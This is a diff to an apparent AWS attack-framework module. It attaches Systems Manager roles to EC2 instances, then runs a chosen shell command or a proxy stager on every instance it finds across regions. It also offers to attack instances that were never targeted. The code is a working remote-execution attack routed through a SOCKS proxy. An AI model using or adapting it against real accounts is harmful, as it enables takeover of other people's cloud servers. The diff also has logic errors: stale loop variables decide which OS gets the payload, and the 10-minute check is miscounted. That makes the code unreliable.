@@ -29,11 +29,12 @@ module_info = {
     'prerequisite_modules': ['enum_ec2'],
 
     # Module arguments to autocomplete when the user hits tab
-    'arguments_to_autocomplete': ['--all-instances', '--replace', '--ip-name', '--role-name'],
+    'arguments_to_autocomplete': ['--target-os', '--all-instances', '--replace', '--ip-name', '--role-name'],
 }
 
 parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
 
+parser.add_argument('--target-os', required=False, default='All', help='This argument is what operating systems to target. Valid options are: Windows, Linux, or All. The default is All')
 parser.add_argument('--all-instances', required=False, default=False, action='store_true', help='Skip vulnerable operating system check and just target every instance')
 parser.add_argument('--replace', required=False, default=False, action='store_true', help='For EC2 instances that already have an instance profile attached to them, this argument will replace those with the Systems Manager instance profile. WARNING: This can cause bad things to happen! You never know what negative side effects this may have on a server without further inspection, because you do not know what permissions you are removing/replacing that the instance already had')
 parser.add_argument('--ip-name', required=False, default=None, help='The name of an existing instance profile with an "EC2 Role for Simple Systems Manager" attached to it. This will skip the automatic role/instance profile enumeration and the searching for a Systems Manager role/instance profile. Note: This argument takes priority over --role-name, so if both arguments are passed in, --role-name will be discarded')
@@ -56,6 +57,11 @@ def main(args, pacu_main):
     fetch_data = pacu_main.fetch_data
     get_regions = pacu_main.get_regions
     ######
+
+    # Make sure args.target_os equals one of All, Windows, or Linux
+    if not (args.target_os.lower() == 'all' or args.target_os.lower() == 'windows' or args.target_os.lower() == 'linux'):
+        print('Invalid option specified for the --target-os argument. Valid options include: All, Windows, or Linux. If --target-os is not specified, the default is All.')
+        return
 
     if fetch_data(['EC2', 'Instances'], 'enum_ec2', '--instances') is False:
         print('Pre-req module not run successfully. Exiting...')
@@ -342,21 +348,98 @@ def main(args, pacu_main):
     print('  Done.\n')
 
     # Start polling SystemsManager/RunCommand to see if instances show up
-    print('Waiting for targeted instances to appear in Systems Manager... This will be checked every 30 seconds for 10 minutes (or until all targeted instances have shown up, whichever is first). After each check, the shell command will be executed against all new instances that showed up since the last check. If an instance has not shown up after 10 minutes, it most likely means that it does not have the SSM Agent installed and is not vulnerable to this attack.')
-    client = boto3.client(
-        'ssm',
-        aws_access_key_id=session.access_key_id,
-        aws_secret_access_key=session.secret_access_key,
-        aws_session_token=session.session_token,
-        config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
-    )
+    print('Waiting for targeted instances to appear in Systems Manager... This will be checked every 30 seconds for 10 minutes (or until all targeted instances have shown up, whichever is first). After each check, the shell command will be executed against all new instances that showed up since the last check. If an instance has not shown up after 10 minutes, it most likely means that it does not have the SSM Agent installed and is not vulnerable to this attack.\n')
 
-    # Check 20 times in 30 second intervals or until all targeted instances have been attacked
-    for i in range(0, 20):
-        response = client.describe_instance_information()
+    # Check 20 times in 30 second intervals (10 minutes) or until all targeted instances have been attacked
+    discovered_instances = []
+    attacked_instances = []
+    ignored_instances = []
+    for i in range(1, 21):
+        this_check_attacked_instances = []
+        for region in regions:
+            # Accumulate a list of instances to attack to minimize the amount of API calls being made
+            windows_instances_to_attack = []
+            linux_instances_to_attack = []
+            client = boto3.client(
+                'ssm',
+                region_name=region,
+                aws_access_key_id=session.access_key_id,
+                aws_secret_access_key=session.secret_access_key,
+                aws_session_token=session.session_token,
+                config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
+            )
 
-        time.sleep(30)
+            # Enumerate instances that appear available to Systems Manager
+            response = client.describe_instance_information()
+            for instance in response['InstanceInformationList']:
+                discovered_instances.append([instance['InstanceId'], instance['PlatformType']])
+            while 'NextToken' in response:
+                response = client.describe_instance_information(
+                    NextToken=response['NextToken']
+                )
+                for instance in response['InstanceInformationList']:
+                    discovered_instances.append([instance['InstanceId'], instance['PlatformType']])
 
+            for instance in discovered_instances:
+                # Has this instance been attacked yet?
+                if instance[0] not in attacked_instances and instance[0] not in ignored_instances:
+                    if args.target_os.lower() == 'all' or instance[1].lower() == args.target_os.lower():
+                        # Is this instance eligible for an attack, but was not targeted?
+                        if instance[0] not in targeted_instances:
+                            action = input('  Instance ID {} (Platform: {}) was not found in the list of targeted instances, but it might be possible to attack it, do you want to attack this instance (a) or ignore it (i)? (a/i) '.format(instance[0], instance[1]))
+                            if action == 'i':
+                                ignored_instances.append(instance[0])
+                                continue
+                        if instance[1].lower() == 'windows':
+                            windows_instances_to_attack.append(instance[0])
+                        elif instance[1].lower() == 'linux':
+                            linux_instances_to_attack.append(instance[0])
+                        else:
+                            print('  Unknown operating system for instance ID {}: {}. Not attacking it...\n'.format(instance[0], instance[1]))
+
+            # Collectively attack all new instances that showed up in the last check for this region
+           
+            # Windows
+            if args.target_os.lower() == 'all' or instance[1].lower() == 'windows':
+                response = client.send_command(
+                    InstanceIds=windows_instances_to_attack,
+                    DocumentName='AWS-RunPowerShellScript',
+                    MaxErrors='100%',
+                    Parameters={
+                        'commands': [shell_command if not shell_command == '' else pp_windows_stager]
+                    }
+                )
+                this_check_attacked_instances.extend(windows_instances_to_attack)
+                attacked_instances.extend(windows_instances_to_attack)
+            
+            # Linux
+            if args.target_os.lower() == 'all' or instance[1].lower() == 'linux':
+                response = client.send_command(
+                    InstanceIds=linux_instances_to_attack,
+                    DocumentName='AWS-RunShellScript',
+                    MaxErrors='100%',
+                    Parameters={
+                        'commands': [shell_command if not shell_command == '' else pp_linux_stager]
+                    }
+                )
+                this_check_attacked_instances.extend(linux_instances_to_attack)
+                attacked_instances.extend(linux_instances_to_attack)
+            
+        print('{} new instances attacked in the latest check: {}\n'.format(len(this_check_attacked_instances), this_check_attacked_instances))
+        
+        # Don't wait 30 seconds after the very last check
+        if not i == 19:
+            print('Waiting 30 seconds...')
+            time.sleep(30)
+
+    if i == 19:
+        # We are here because it has been 10 minutes
+        print('  It has been 10 minutes, if any target instances were not successfully attacked, then that most likely means they are not vulnerable to this attack (most likely the SSM Agent is not installed on the instances).\n')
+        print('  Successfully attacked the following instances: {}\n'.format(attacked_instances))
+    else:
+        # We are here because all targeted instances have been attacked
+        print('  All targeted instances showed up and were attacked.\n')
+        print('  Successfully attacked the following instances: {}\n'.format(attacked_instances))
 
     print('{} completed.'.format(os.path.basename(__file__)))
     return
